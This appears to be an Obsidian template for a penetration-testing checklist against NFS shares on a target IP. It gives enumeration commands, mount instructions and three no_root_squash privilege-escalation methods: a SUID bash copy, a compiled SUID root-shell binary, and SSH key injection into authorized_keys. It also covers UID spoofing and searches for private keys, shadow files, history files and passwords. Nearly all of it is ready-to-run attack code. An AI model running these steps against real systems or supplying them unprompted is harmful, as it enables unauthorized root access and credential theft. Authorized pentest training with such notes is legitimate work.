# NFS — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip -%>

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %>,111 --script=nfs-showmount,nfs-ls,nfs-statfs,rpcinfo <% ip %>
```

---

## Enumerate Exports
```bash
showmount -e <% ip %>
```

```bash
nmap -sV -p 111 --script=rpcinfo <% ip %>
```

```bash
rpcinfo -p <% ip %>
```

---

## Mount Share
```bash
# Create local mount point
mkdir /mnt/nfs

# NFS v3 (no root squashing workarounds)
sudo mount -t nfs -o nolock,nfsvers=3 <% ip %>:/<share> /mnt/nfs

# NFS v4
sudo mount -t nfs4 <% ip %>:/<share> /mnt/nfs

# Without version lock
sudo mount -t nfs <% ip %>:/<share> /mnt/nfs
```

```bash
# Verify mount
df -h /mnt/nfs
ls -la /mnt/nfs
```

```bash
# Unmount
sudo umount /mnt/nfs
```

---

## Enumerate Files
```bash
ls -laR /mnt/nfs 2>/dev/null
find /mnt/nfs -type f 2>/dev/null
find /mnt/nfs -name "*.txt" -o -name "*.conf" -o -name "*.key" -o -name "*.pem" 2>/dev/null
```

---

## No Root Squash Exploitation

> [!warning] If `no_root_squash` is configured, files created by root locally appear as root on the NFS share — privilege escalation!

### Check export options
```bash
showmount -e <% ip %>
cat /etc/exports  # if you have shell on target
```

### Method 1 — SUID bash copy
```bash
# On attacker (as root)
sudo cp /bin/bash /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
sudo chmod +x /mnt/nfs/bash
```

```bash
# On target machine
<path_on_target>/bash -p
whoami  # should be root
```

### Method 2 — SUID C binary
```bash
# On attacker (as root)
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc /tmp/suid.c -o /mnt/nfs/suid
sudo chmod +s /mnt/nfs/suid
```

```bash
# On target
<path>/suid
```

### Method 3 — SSH key injection (if NFS share is home directory)
```bash
# If /home/user is shared with no_root_squash
mkdir -p /mnt/nfs/.ssh
echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs/.ssh/authorized_keys
chmod 700 /mnt/nfs/.ssh
chmod 600 /mnt/nfs/.ssh/authorized_keys
```

```bash
ssh -i ~/.ssh/id_rsa <user>@<% ip %>
```

---

## UID Spoofing (bypass root squash with matching UID)
```bash
# Find UID of file owner on NFS share
ls -lan /mnt/nfs
```

```bash
# Create local user with same UID as remote file owner
sudo useradd -u <uid> nfs_user
su nfs_user
# Now you have the same permissions as the remote user
```

---

## Check for Sensitive Files
```bash
find /mnt/nfs -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find /mnt/nfs -name "shadow" -o -name "passwd" 2>/dev/null
find /mnt/nfs -name ".bash_history" 2>/dev/null
find /mnt/nfs -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null
grep -r "password\|passwd\|secret\|token" /mnt/nfs/ 2>/dev/null
```

---

## Notes
